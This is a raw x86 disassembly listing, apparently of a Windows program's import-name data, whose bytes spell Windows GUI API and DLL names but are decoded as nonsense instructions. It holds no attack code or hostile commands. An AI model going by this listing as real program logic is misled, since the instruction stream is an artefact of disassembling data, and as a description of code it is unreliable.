  412dea:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  412df1:	outs   dx,BYTE PTR ds:[esi]
  412df2:	addr16 inc ecx
  412df4:	add    BYTE PTR [eax],al
  412df6:	adc    eax,0x6c655202
  412dfb:	gs popa 
  412dfd:	jae    0x412e64
  412dff:	inc    esp
  412e00:	inc    ebx
  412e01:	add    BYTE PTR [eax+eax*1],ah
  412e04:	inc    ebx
  412e05:	push   0x65676e61
  412e0a:	dec    ebp
  412e0b:	outs   dx,BYTE PTR gs:[esi]
  412e0d:	jne    0x412e66
  412e0f:	add    BYTE PTR [ebx],bh
  412e11:	add    BYTE PTR [ebx+0x68],al
  412e14:	arpl   WORD PTR gs:[ebx+0x4d],bp
  412e18:	outs   dx,BYTE PTR gs:[esi]
  412e1a:	jne    0x412e65
  412e1c:	je     0x412e83
  412e1e:	ins    DWORD PTR es:[edi],dx
  412e1f:	add    al,ch
  412e21:	add    DWORD PTR [edi+0x70],ecx
  412e24:	outs   dx,BYTE PTR gs:[esi]
  412e26:	dec    ecx
  412e27:	arpl   WORD PTR [edi+0x6e],bp
  412e2a:	add    BYTE PTR [eax],al
  412e2c:	mov    ds:0x57734901,al
  412e31:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  412e38:	imul   esp,DWORD PTR [ebx+0x6f],0xce006564
  412e3f:	add    DWORD PTR [ebp+0x65],ecx
  412e42:	jae    0x412eb7
  412e44:	popa   
  412e45:	addr16 gs inc edx
  412e48:	outs   dx,DWORD PTR ds:[esi]
  412e49:	js     0x412e8c
  412e4b:	add    BYTE PTR [ebp+0x61724400],dh
  412e51:	ja     0x412ea0
  412e53:	outs   dx,BYTE PTR gs:[esi]
  412e55:	jne    0x412e99
  412e57:	popa   
  412e58:	jb     0x412e5a
  412e5a:	inc    edx
  412e5b:	add    dl,BYTE PTR [ebx+0x65]
  412e5e:	je     0x412ea6
  412e60:	outs   dx,DWORD PTR ds:[esi]
  412e61:	jb     0x412ec8
  412e63:	addr16 jb 0x412ed5
  412e66:	jne    0x412ed6
  412e68:	fs push edi
  412e6a:	imul   ebp,DWORD PTR [esi+0x64],0xc200776f
  412e71:	add    dh,BYTE PTR [edi+0x76]
  412e74:	jae    0x412ee6
  412e76:	jb     0x412ee1
  412e78:	outs   dx,BYTE PTR ds:[esi]
  412e79:	je     0x412ee1
  412e7b:	push   edi
  412e7c:	add    BYTE PTR [eax],al
  412e7e:	mov    al,ds:0x57734901
  412e83:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412e8a:	push   ebp
  412e8b:	add    DWORD PTR [edi+0x65],eax
  412e8e:	je     0x412ee3
  412e90:	arpl   WORD PTR [edx+0x6f],si
  412e93:	ins    BYTE PTR es:[edi],dx
  412e94:	ins    BYTE PTR es:[edi],dx
  412e95:	push   eax
  412e96:	outs   dx,DWORD PTR ds:[esi]
  412e97:	jae    0x412e99
  412e99:	add    al,dh
  412e9b:	add    BYTE PTR [edi+0x65],al
  412e9e:	je     0x412ee1
  412ea0:	jae    0x412f1b
  412ea2:	outs   dx,BYTE PTR ds:[esi]
  412ea3:	arpl   WORD PTR [ebx+0x65],cx
  412ea6:	jns    0x412efb
  412ea8:	je     0x412f0b
  412eaa:	je     0x412f11
  412eac:	add    BYTE PTR [eax],al
  412eae:	or     eax,0x74654701
  412eb3:	inc    esp
  412eb4:	imul   esp,DWORD PTR [ecx+0x6c],0x6142676f
  412ebb:	jae    0x412f22
  412ebd:	push   ebp
  412ebe:	outs   dx,BYTE PTR ds:[esi]
  412ebf:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x5502a500
  412ec7:	jo     0x412f2d
  412ec9:	popa   
  412eca:	je     0x412f31
  412ecc:	push   edi
  412ecd:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412ed4:	or     eax,DWORD PTR [ecx]
  412ed6:	inc    edi
  412ed7:	gs je  0x412f1e
  412eda:	inc    ebx
  412edb:	inc    ebp
  412edc:	js     0x412ede
  412ede:	stos   DWORD PTR es:[edi],eax
  412edf:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  412ee3:	fs inc ebx
  412ee5:	jne    0x412f59
  412ee7:	jae    0x412f58
  412ee9:	jb     0x412f2c
  412eeb:	add    BYTE PTR [edx+eax*1+0x53],bl
  412eef:	gs je  0x412f45
  412ef2:	arpl   WORD PTR [edx+0x6f],si
  412ef5:	ins    BYTE PTR es:[edi],dx
  412ef6:	ins    BYTE PTR es:[edi],dx
  412ef7:	push   edx
  412ef8:	popa   
  412ef9:	outs   dx,BYTE PTR ds:[esi]
  412efa:	add    BYTE PTR gs:[bx+si],al
  412efe:	cmp    DWORD PTR [eax],eax
  412f00:	inc    ebx
  412f01:	push   0x70557261
  412f06:	jo     0x412f6d
  412f08:	jb     0x412f61
  412f0a:	add    BYTE PTR [eax],al
  412f0c:	fwait
  412f0d:	add    dl,BYTE PTR [ebp+0x6e]
  412f10:	ins    BYTE PTR es:[edi],dx
  412f11:	outs   dx,DWORD PTR ds:[esi]
  412f12:	popa   
  412f13:	fs dec ebx
  412f15:	gs jns 0x412f7a
  412f18:	outs   dx,DWORD PTR ds:[esi]
  412f19:	popa   
  412f1a:	jb     0x412f80
  412f1c:	dec    esp
  412f1d:	popa   
  412f1e:	jns    0x412f8f
  412f20:	jne    0x412f96
  412f22:	add    BYTE PTR [eax],al
  412f24:	push   esi
  412f25:	add    DWORD PTR [edi+0x65],eax
  412f28:	je     0x412f7d
  412f2a:	arpl   WORD PTR [edx+0x6f],si
  412f2d:	ins    BYTE PTR es:[edi],dx
  412f2e:	ins    BYTE PTR es:[edi],dx
  412f2f:	push   edx
  412f30:	popa   
  412f31:	outs   dx,BYTE PTR ds:[esi]
  412f32:	add    BYTE PTR gs:[bx+si],al
  412f36:	ins    DWORD PTR es:[edi],dx
  412f37:	add    DWORD PTR [edi+0x65],eax
  412f3a:	je     0x412f93
  412f3c:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  412f43:	outs   dx,BYTE PTR ds:[esi]
  412f44:	addr16 push edi
  412f46:	add    BYTE PTR [eax],al
  412f48:	add    BYTE PTR [ecx],0x49
  412f4b:	outs   dx,BYTE PTR ds:[esi]
  412f4c:	data16 ins BYTE PTR es:[edi],dx
  412f4e:	popa   
  412f4f:	je     0x412fb6
  412f51:	push   edx
  412f52:	arpl   WORD PTR gs:[eax+eax*1+0x16],si
  412f57:	add    dl,BYTE PTR [edx+0x65]
  412f5a:	ins    DWORD PTR es:[edi],dx
  412f5b:	outs   dx,DWORD PTR ds:[esi]
  412f5c:	jbe    0x412fc3
  412f5e:	dec    ebp
  412f5f:	outs   dx,BYTE PTR gs:[esi]
  412f61:	jne    0x412f63
  412f63:	add    BYTE PTR [ebx+0x61724400],ch
  412f69:	ja     0x412fac
  412f6b:	outs   dx,BYTE PTR ds:[esi]
  412f6c:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  412f73:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  412f78:	das    
  412f79:	add    dl,BYTE PTR [ebx+0x65]
  412f7c:	je     0x412fbf
  412f7e:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  412f82:	gs push edi
  412f84:	imul   ebp,DWORD PTR [esi+0x64],0x9c00776f
  412f8b:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412f8f:	ins    BYTE PTR es:[edi],dx
  412f90:	outs   dx,DWORD PTR ds:[esi]
  412f91:	addr16 inc edx
  412f93:	outs   dx,DWORD PTR ds:[esi]
  412f94:	js     0x412fe6
  412f96:	popa   
  412f97:	jb     0x412ffa
  412f99:	ins    DWORD PTR es:[edi],dx
  412f9a:	inc    ecx
  412f9b:	add    bh,ah
  412f9d:	add    BYTE PTR [esi+0x72],al
  412fa0:	popa   
  412fa1:	ins    DWORD PTR es:[edi],dx
  412fa2:	gs push edx
  412fa4:	arpl   WORD PTR gs:[eax+eax*1-0x68],si
  412fa9:	add    DWORD PTR [ecx+0x73],ecx
  412fac:	inc    esp
  412fad:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  412fb4:	jae    0x413029
  412fb6:	popa   
  412fb7:	addr16 gs push edi
  412fba:	add    BYTE PTR [eax],al
  412fbc:	xor    DWORD PTR [eax],eax
  412fbe:	inc    ebx
  412fbf:	push   0x72507261
  412fc4:	gs jbe 0x41301e
  412fc7:	add    BYTE PTR ds:0x74654701,dl
  412fcd:	inc    esi
  412fce:	outs   dx,DWORD PTR ds:[esi]
  412fcf:	jb     0x413036
  412fd1:	addr16 jb 0x413043
  412fd4:	jne    0x413044
  412fd6:	fs push edi
  412fd8:	imul   ebp,DWORD PTR [esi+0x64],0xb700776f
  412fdf:	add    dl,BYTE PTR [edi+0x61]
  412fe2:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x706e4972
  412fea:	jne    0x413060
  412fec:	dec    ecx
  412fed:	fs ins BYTE PTR es:[edi],dx
  412fef:	add    BYTE PTR gs:[eax],al
  412ff2:	push   edi
  412ff3:	add    dl,BYTE PTR [ebx+0x65]
  412ff6:	je     0x413048
  412ff8:	jb     0x413069
  412ffa:	jo     0x413053
  412ffc:	add    BYTE PTR [eax],al
  412ffe:	dec    eax
  412fff:	add    dl,BYTE PTR [ebx+0x65]
  413002:	je     0x413051
  413004:	outs   dx,BYTE PTR gs:[esi]
  413006:	jne    0x413008
  413008:	scas   al,BYTE PTR es:[edi]
  413009:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41300d:	fs inc ebx
  41300f:	jne    0x413083
  413011:	jae    0x413082
  413013:	jb     0x41306c
  413015:	add    BYTE PTR [edi+0x2],bl
  413018:	push   ebx
  413019:	gs je  0x41306f
  41301c:	jns    0x413091
  41301e:	inc    ebx
  41301f:	outs   dx,DWORD PTR ds:[esi]
  413020:	ins    BYTE PTR es:[edi],dx
  413021:	outs   dx,DWORD PTR ds:[esi]
  413022:	jb     0x413097
  413024:	add    BYTE PTR [eax],al
  413026:	xchg   esp,eax
  413027:	add    dl,BYTE PTR [edx+esi*2+0x61]
  41302b:	outs   dx,BYTE PTR ds:[esi]
  41302c:	jae    0x41309a
  41302e:	popa   
  41302f:	je     0x413096
  413031:	inc    ecx
  413032:	arpl   WORD PTR [ebx+0x65],sp
  413035:	ins    BYTE PTR es:[edi],dx
  413036:	gs jb  0x41309a
  413039:	je     0x4130aa
  41303b:	jb     0x413094
  41303d:	add    BYTE PTR [edi+0x66654400],cl
  413043:	push   edi
  413044:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  41304b:	outs   dx,DWORD PTR ds:[esi]
  41304c:	arpl   WORD PTR [edi+0x0],dx
  41304f:	add    BYTE PTR [ecx+0x0],ah
  413052:	inc    ebx
  413053:	jb     0x4130ba
  413055:	popa   
  413056:	je     0x4130bd
  413058:	push   eax
  413059:	outs   dx,DWORD PTR ds:[esi]
  41305a:	jo     0x4130d1
  41305c:	jo     0x4130ab
  41305e:	outs   dx,BYTE PTR gs:[esi]
  413060:	jne    0x413062
  413062:	push   ecx
  413063:	add    dl,BYTE PTR [ebx+0x65]
  413066:	je     0x4130b8
  413068:	popa   
  413069:	jb     0x4130d0
  41306b:	outs   dx,BYTE PTR ds:[esi]
  41306c:	je     0x41306e
  41306e:	popf   
  41306f:	add    BYTE PTR [ecx+ebp*2+0x61],al
  413073:	ins    BYTE PTR es:[edi],dx
  413074:	outs   dx,DWORD PTR ds:[esi]
  413075:	addr16 inc edx
  413077:	outs   dx,DWORD PTR ds:[esi]
  413078:	js     0x4130ca
  41307a:	popa   
  41307b:	jb     0x4130de
  41307d:	ins    DWORD PTR es:[edi],dx
  41307e:	push   edi
  41307f:	add    BYTE PTR [edx+0x6c695402],cl
  413085:	gs push edi
  413087:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  41308e:	sub    DWORD PTR [eax],eax
  413090:	inc    ebx
  413091:	push   0x6f4c7261
  413096:	ja     0x4130fd
  413098:	jb     0x4130f1
  41309a:	add    BYTE PTR [eax],al
  41309c:	out    dx,eax
  41309d:	add    DWORD PTR [eax+0x65],edx
  4130a0:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  4130a5:	jae    0x413108
  4130a7:	addr16 gs push edi
  4130aa:	add    BYTE PTR [eax],al
  4130ac:	jne    0x4130af
  4130ae:	inc    edi
  4130af:	gs je  0x413109
  4130b2:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4130b9:	js     0x41312f
  4130bb:	inc    ecx
  4130bc:	add    BYTE PTR [eax],al
  4130be:	add    DWORD PTR ds:[edi+0x65],eax
  4130c2:	je     0x413111
  4130c4:	gs jae 0x41313a
  4130c7:	popa   
  4130c8:	addr16 gs push edi
  4130cb:	add    BYTE PTR ds:0x61684300,ch
  4130d1:	jb     0x413121
  4130d3:	gs js  0x41314a
  4130d6:	push   edi
  4130d7:	add    BYTE PTR [ecx+eax*1+0x64616f4c],bh
  4130de:	push   ebx
  4130df:	je     0x413153
  4130e1:	imul   ebp,DWORD PTR [esi+0x67],0x2800057
  4130e8:	push   ebx
  4130e9:	push   0x6957776f
  4130ee:	outs   dx,BYTE PTR ds:[esi]
  4130ef:	outs   dx,DWORD PTR fs:[esi]
  4130f1:	ja     0x413134
  4130f3:	jae    0x41316e
  4130f5:	outs   dx,BYTE PTR ds:[esi]
  4130f6:	arpl   WORD PTR [eax],ax
  4130f8:	add    BYTE PTR ss:[ebx+0x68],al
  4130fc:	popa   
  4130fd:	jb     0x413154
  4130ff:	jo     0x413171
  413101:	gs jb  0x413145
  413104:	add    BYTE PTR [eax],al
  413106:	sti    
  413107:	add    DWORD PTR [eax+0x74],edx
  41310a:	dec    ecx
  41310b:	outs   dx,BYTE PTR ds:[esi]
  41310c:	push   edx
  41310d:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  413112:	sbb    eax,DWORD PTR [eax]
  413114:	inc    ebx
  413115:	popa   
  413116:	ins    BYTE PTR es:[edi],dx
  413117:	ins    BYTE PTR es:[edi],dx
  413118:	push   edi
  413119:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  413120:	outs   dx,DWORD PTR ds:[esi]
  413121:	arpl   WORD PTR [edi+0x0],dx
  413124:	lahf   
  413125:	add    BYTE PTR [ecx+ebp*2+0x73],al
  413129:	jo     0x41318c
  41312b:	je     0x413190
  41312d:	push   0x7373654d
  413132:	popa   
  413133:	addr16 gs inc ecx
  413136:	add    BYTE PTR [eax],al
  413138:	mov    BYTE PTR [edx],al
  41313a:	push   esp
  41313b:	popa   
  41313c:	bound  esp,QWORD PTR [edx+0x65]
  41313f:	fs push esp
  413141:	gs js  0x4131b8
  413144:	dec    edi
  413145:	jne    0x4131bb
  413147:	push   edi
  413148:	add    BYTE PTR [eax],al
  41314a:	sub    eax,DWORD PTR [edx]
  41314c:	push   ebx
  41314d:	outs   dx,BYTE PTR gs:[esi]
  41314f:	fs dec ebp
  413151:	gs jae 0x4131c7
  413154:	popa   
  413155:	addr16 gs push edi
  413158:	add    BYTE PTR [eax],al
  41315a:	add    DWORD PTR fs:[edi+0x65],eax
  41315e:	je     0x4131b5
  413160:	jo     0x4131c6
  413162:	popa   
  413163:	je     0x4131ca
  413165:	push   edx
  413166:	outs   dx,BYTE PTR ds:[si]
  413168:	add    BYTE PTR [eax],al
  41316a:	mov    eax,0x61724400
  41316f:	ja     0x4131c4
  413171:	je     0x4131d4
  413173:	je     0x4131da
  413175:	push   edi
  413176:	add    BYTE PTR [eax],al
  413178:	sub    eax,0x74654701
  41317d:	dec    ebp
  41317e:	outs   dx,BYTE PTR gs:[esi]
  413180:	jne    0x4131c5
  413182:	push   0x4d6b6365
  413187:	popa   
  413188:	jb     0x4131f5
  41318a:	inc    esp
  41318b:	imul   ebp,DWORD PTR [ebp+0x65],0x6f69736e
  413192:	outs   dx,BYTE PTR ds:[esi]
  413193:	jae    0x413195
  413195:	add    BYTE PTR [ebx+0x616f4c01],bh
  41319b:	fs push ebx
  41319d:	je     0x413211
  41319f:	imul   ebp,DWORD PTR [esi+0x67],0x2590041
  4131a6:	push   ebx
  4131a7:	gs je  0x4131fc
  4131aa:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  4131af:	jo     0x413225
  4131b1:	jns    0x4131b3
  4131b3:	add    BYTE PTR [edi+0x0],dl
  4131b6:	inc    ebx
  4131b7:	jb     0x41321e
  4131b9:	popa   
  4131ba:	je     0x413221
  4131bc:	inc    esp
  4131bd:	imul   esp,DWORD PTR [ecx+0x6c],0x6e49676f
  4131c4:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  4131cc:	jb     0x41322f
  4131ce:	ins    DWORD PTR es:[edi],dx
  4131cf:	push   edi
  4131d0:	add    BYTE PTR [eax],al
  4131d2:	cmp    BYTE PTR [eax],al
  4131d4:	inc    ebx
  4131d5:	push   0x70557261
  4131da:	jo     0x413241
  4131dc:	jb     0x413220
  4131de:	jne    0x413246
  4131e0:	push   di
  4131e2:	add    BYTE PTR [eax],al
  4131e4:	ja     0x4131e7
  4131e6:	inc    edi
  4131e7:	gs je  0x413241
  4131ea:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4131f1:	js     0x413267
  4131f3:	dec    esp
  4131f4:	outs   dx,BYTE PTR gs:[esi]
  4131f6:	addr16 je 0x413261
  4131f9:	push   edi
  4131fa:	add    BYTE PTR [eax],al
  4131fc:	xor    eax,0x61684300
  413201:	jb     0x413257
  413203:	outs   dx,DWORD PTR ds:[esi]
  413204:	dec    edi
  413205:	gs ins DWORD PTR es:[edi],dx
  413207:	push   edi
  413208:	add    BYTE PTR [eax],al
  41320a:	dec    edx
  41320b:	add    dl,BYTE PTR [ebx+0x65]
  41320e:	je     0x41325d
  413210:	outs   dx,BYTE PTR gs:[esi]
  413212:	jne    0x413258
  413214:	gs popaw 
  413217:	jne    0x413285
  413219:	je     0x413264
  41321b:	je     0x413282
  41321d:	ins    DWORD PTR es:[edi],dx
  41321e:	add    BYTE PTR [eax],al
  413220:	push   ebp
  413221:	push   ebx
  413222:	inc    ebp
  413223:	push   edx
  413224:	xor    esi,DWORD PTR [edx]
  413226:	cs fs ins BYTE PTR es:[edi],dx
  413229:	ins    BYTE PTR es:[edi],dx
  41322a:	add    BYTE PTR [eax],al
  41322c:	push   ebx
  41322d:	add    BYTE PTR [ecx+0x6d],cl
  413230:	popa   
  413231:	addr16 gs dec esp
  413234:	imul   esi,DWORD PTR [ebx+0x74],0x7465535f
  41323b:	dec    ecx
  41323c:	arpl   WORD PTR [edi+0x6e],bp
  41323f:	push   ebx
  413240:	imul   edi,DWORD PTR [edx+0x65],0x49005600
  413247:	ins    DWORD PTR es:[edi],dx
  413248:	popa   
  413249:	addr16 gs dec esp
  41324c:	imul   esi,DWORD PTR [ebx+0x74],0x6972575f
  413253:	je     0x4132ba
  413255:	add    BYTE PTR [esi+0x0],cl
  413258:	dec    ecx
  413259:	ins    DWORD PTR es:[edi],dx
  41325a:	popa   
  41325b:	addr16 gs dec esp
  41325e:	imul   esi,DWORD PTR [ebx+0x74],0x7065525f
  413265:	ins    BYTE PTR es:[edi],dx
  413266:	popa   
  413267:	arpl   WORD PTR [ebp+0x49],sp
  41326a:	arpl   WORD PTR [edi+0x6e],bp
  41326d:	add    BYTE PTR [esi],dh
  41326f:	add    BYTE PTR [ecx+0x6d],cl
  413272:	popa   
  413273:	addr16 gs dec esp
  413276:	imul   esi,DWORD PTR [ebx+0x74],0x6172445f
  41327d:	ja     0x41327f
  41327f:	add    BYTE PTR [ebx],dl
  413281:	add    BYTE PTR [ebx+0x72],al
  413284:	gs popa 
  413286:	je     0x4132ed
  413288:	push   eax
  413289:	jb     0x4132fa
  41328b:	jo     0x4132f2
  41328d:	jb     0x413303
  41328f:	jns    0x4132e4
  413291:	push   0x50746565
  413296:	popa   
  413297:	addr16 gs push edi
  41329a:	add    BYTE PTR [eax],al
  41329c:	pop    esp
  41329d:	add    BYTE PTR [eax+0x72],dl
  4132a0:	outs   dx,DWORD PTR ds:[esi]
  4132a1:	jo     0x413308
  4132a3:	jb     0x413319
  4132a5:	jns    0x4132fa
  4132a7:	push   0x57746565
  4132ac:	add    BYTE PTR [eax],al
  4132ae:	inc    ebx
  4132af:	dec    edi
  4132b0:	dec    ebp
  4132b1:	inc    ebx
  4132b2:	push   esp
  4132b3:	dec    esp
  4132b4:	xor    esi,DWORD PTR [edx]
  4132b6:	cs fs ins BYTE PTR es:[edi],dx
  4132b9:	ins    BYTE PTR es:[edi],dx
  4132ba:	add    BYTE PTR [eax],al
  4132bc:	mov    WORD PTR [eax],es
  4132be:	inc    ebx
  4132bf:	jb     0x413326
  4132c1:	popa   
  4132c2:	je     0x413329
  4132c4:	inc    ebx
  4132c5:	outs   dx,DWORD PTR ds:[esi]
  4132c6:	ins    DWORD PTR es:[edi],dx
  4132c7:	jo     0x41332a
  4132c9:	je     0x413334
  4132cb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  4132cf:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xa5000070
  4132d7:	add    BYTE PTR [ebx+0x72],al
  4132da:	gs popa 
  4132dc:	je     0x413343
  4132de:	push   eax
  4132df:	popa   
  4132e0:	ins    BYTE PTR es:[edi],dx
  4132e1:	gs je  0x413358
  4132e4:	add    BYTE PTR gs:[ebx+0x746e4901],dl
  4132eb:	gs jb  0x413361
  4132ee:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  4132f3:	imul   esi,DWORD PTR [eax+0x52],0x746365
  4132fa:	into   
  4132fb:	add    DWORD PTR [ebx+0x65],edx
  4132fe:	ins    BYTE PTR es:[edi],dx
  4132ff:	arpl   WORD PTR gs:[edi+ecx*2+0x62],si
  413304:	push   0x65
  413306:	arpl   WORD PTR [eax+eax*1+0x0],si
  41330a:	jp     0x41330d
  41330c:	inc    edi
  41330d:	gs je  0x413363
  413310:	jns    0x413385
  413312:	je     0x413379
  413314:	ins    DWORD PTR es:[edi],dx
  413315:	push   eax
  413316:	popa   
  413317:	ins    BYTE PTR es:[edi],dx
  413318:	gs je  0x41338f
  41331b:	gs push ebp
  41331d:	jae    0x413384
  41331f:	add    BYTE PTR [ecx+0x65724300],cl
  413325:	popa   
  413326:	je     0x41338d
  413328:	inc    edx
  413329:	jb     0x4133a0
  41332b:	jae    0x413395
  41332d:	dec    ecx
  41332e:	outs   dx,BYTE PTR ds:[esi]
  41332f:	imul   esi,DWORD PTR fs:[edx+0x65],0xe8007463
  413337:	add    DWORD PTR [ebx+0x65],edx
  41333a:	je     0x413389
  41333c:	popa   
  41333d:	jo     0x41338c
  41333f:	outs   dx,DWORD PTR ds:[esi]
  413340:	fs add BYTE PTR gs:[eax],al
  413344:	pop    esp
  413345:	add    DWORD PTR [edi+0x65],eax
  413348:	je     0x413396
  41334a:	popa   
  41334b:	jns    0x4133bc
  41334d:	jne    0x4133c3
  41334f:	add    bh,ch
  413351:	add    DWORD PTR [ebx+0x65],edx
  413354:	je     0x4133a6
  413356:	imul   edi,DWORD PTR [eax+0x65],0xc700006c
  41335d:	add    DWORD PTR [ebx+0x61],edx
  413360:	jbe    0x4133c7
  413362:	inc    esp
  413363:	inc    ebx
  413364:	add    BYTE PTR [eax],al
  413366:	pop    edi
  413367:	add    DWORD PTR [edi+0x65],eax
  41336a:	je     0x4133b9
  41336c:	popa   
  41336d:	jo     0x4133bc
  41336f:	outs   dx,DWORD PTR ds:[esi]
  413370:	fs add BYTE PTR gs:[eax],al
  413374:	mov    ds:0x65724300,al
  413379:	popa   
  41337a:	je     0x4133e1
  41337c:	dec    ecx
  41337d:	inc    ebx
  41337e:	push   edi
  41337f:	add    BYTE PTR [esi+0x65724300],dl
  413385:	popa   
  413386:	je     0x4133ed
  413388:	inc    ebp
  413389:	ins    BYTE PTR es:[edi],dx
  41338a:	ins    BYTE PTR es:[edi],dx
  41338b:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  413392:	outs   dx,BYTE PTR ds:[esi]
  413393:	dec    ecx
  413394:	outs   dx,BYTE PTR ds:[esi]
  413395:	imul   esi,DWORD PTR fs:[edx+0x65],0x99007463
  41339d:	add    BYTE PTR [ebx+0x72],al
  4133a0:	gs popa 
  4133a2:	je     0x413409
  4133a4:	inc    esi
  4133a5:	outs   dx,DWORD PTR ds:[esi]
  4133a6:	outs   dx,BYTE PTR ds:[esi]
  4133a7:	je     0x4133ea
  4133a9:	add    BYTE PTR ds:0x61725402,cl
  4133af:	outs   dx,BYTE PTR ds:[esi]
  4133b0:	jae    0x41341e
  4133b2:	popa   
  4133b3:	je     0x41341a
  4133b5:	inc    ebx
  4133b6:	push   0x65737261
  4133bb:	je     0x413406
  4133bd:	outs   dx,BYTE PTR ds:[esi]
  4133be:	outs   dx,WORD PTR ds:[esi]
  4133c0:	add    BYTE PTR [eax],al
  4133c2:	out    dx,al
  4133c3:	add    DWORD PTR [ebx+0x65],edx
  4133c6:	je     0x413418
  4133c8:	popa   
  4133c9:	ins    BYTE PTR es:[edi],dx
  4133ca:	gs je  0x413441
  4133cd:	gs inc ebp
  4133cf:	outs   dx,BYTE PTR ds:[esi]
  4133d0:	je     0x413444
  4133d2:	imul   esp,DWORD PTR [ebp+0x73],0x5301d300
  4133d9:	gs je  0x41341e
  4133dc:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x6d694470
  4133e4:	outs   dx,BYTE PTR gs:[esi]
  4133e6:	jae    0x413451
  4133e8:	outs   dx,DWORD PTR ds:[esi]
  4133e9:	outs   dx,BYTE PTR ds:[esi]
  4133ea:	inc    ebp
  4133eb:	js     0x4133ed
  4133ed:	add    BYTE PTR [esi],al
  4133ef:	add    dl,BYTE PTR [ebx+0x74]
  4133f2:	jb     0x413459
  4133f4:	je     0x413459
  4133f6:	push   0x746c42
  4133fb:	add    BYTE PTR [eax+eax*1+0x61657243],dl
  413402:	je     0x413469
  413404:	inc    esp
  413405:	imul   esi,DWORD PTR [ebx+0x63],0x61647261
  41340c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  413410:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x13f0070
  413418:	inc    edi
  413419:	gs je  0x413460
  41341c:	dec    ecx
  41341d:	inc    edx
  41341e:	inc    ebx
  41341f:	outs   dx,DWORD PTR ds:[esi]
  413420:	ins    BYTE PTR es:[edi],dx
  413421:	outs   dx,DWORD PTR ds:[esi]
  413422:	jb     0x413478
  413424:	popa   
  413425:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  413429:	add    BYTE PTR [edi+0x6e694c01],dl
  41342f:	gs push esp
  413431:	outs   dx,DWORD PTR ds:[esi]
  413432:	add    BYTE PTR [eax],al
  413434:	clc    
  413435:	add    DWORD PTR [ebx+0x65],edx
  413438:	je     0x41348e
  41343a:	gs js  0x4134b1
  41343d:	inc    ecx
  41343e:	ins    BYTE PTR es:[edi],dx
  41343f:	imul   esp,DWORD PTR [edi+0x6e],0x1a40000
  413446:	push   eax
  413447:	popa   
  413448:	je     0x41348c
  41344a:	ins    BYTE PTR es:[edi],dx
  41344b:	je     0x41344d
  41344d:	add    BYTE PTR [ebp+0x0],dh
  413450:	inc    edx
  413451:	imul   ebp,DWORD PTR gs:[bp+0x50],0x687461
  41345a:	test   al,0x0
  41345c:	inc    ebx
  41345d:	jb     0x4134c4
  41345f:	popa   
  413460:	je     0x4134c7
  413462:	push   eax
  413463:	outs   dx,BYTE PTR gs:[esi]
  413465:	dec    ecx
  413466:	outs   dx,BYTE PTR ds:[esi]
  413467:	imul   esi,DWORD PTR fs:[edx+0x65],0x83007463
  41346f:	add    DWORD PTR [edi+0x65],eax
  413472:	je     0x4134c8
  413474:	gs js  0x4134eb
  413477:	inc    ebp
  413478:	js     0x4134ee
  41347a:	outs   dx,BYTE PTR gs:[esi]
  41347c:	je     0x4134ce
  41347e:	outs   dx,DWORD PTR ds:[esi]
  41347f:	imul   ebp,DWORD PTR [esi+0x74],0x413233
  413486:	aam    0x1
  413488:	push   ebx
  413489:	gs je  0x4134ce
  41348c:	imul   eax,DWORD PTR [ebx+0x6f],0x6c
  413490:	outs   dx,DWORD PTR ds:[esi]
  413491:	jb     0x413493
  413493:	add    bl,dh
  413495:	add    DWORD PTR [ebx+0x65],edx
  413498:	je     0x4134ec
  41349a:	dec    edi
  41349b:	push   eax
  41349c:	xor    al,BYTE PTR [eax]
  41349e:	stos   BYTE PTR es:[edi],al
  41349f:	add    BYTE PTR [ebx+0x72],al
  4134a2:	gs popa 
  4134a4:	je     0x41350b
  4134a6:	push   eax
  4134a7:	outs   dx,DWORD PTR ds:[esi]
  4134a8:	ins    BYTE PTR es:[edi],dx
  4134a9:	jns    0x413512
  4134ab:	outs   dx,DWORD PTR ds:[esi]
  4134ac:	outs   dx,BYTE PTR ds:[esi]
  4134ad:	push   edx
  4134ae:	outs   dx,BYTE PTR ds:[si]
  4134b0:	add    BYTE PTR [eax],al
  4134b2:	xchg   DWORD PTR [ecx],eax
  4134b4:	inc    edi
  4134b5:	gs je  0x41350c
  4134b8:	gs js  0x41352f
  4134bb:	inc    ebp
  4134bc:	js     0x413532
  4134be:	outs   dx,BYTE PTR gs:[esi]
  4134c0:	je     0x413512
  4134c2:	outs   dx,DWORD PTR ds:[esi]
  4134c3:	imul   ebp,DWORD PTR [esi+0x74],0x2010057
  4134ca:	push   ebx
  4134cb:	gs je  0x413525
  4134ce:	imul   ebp,DWORD PTR [esi+0x64],0x724f776f
  4134d5:	addr16 inc ebp
  4134d7:	js     0x4134d9
  4134d9:	add    BYTE PTR [edi+0x65724300],ah
  4134df:	popa   
  4134e0:	je     0x413547
  4134e2:	push   eax
  4134e3:	outs   dx,BYTE PTR gs:[esi]
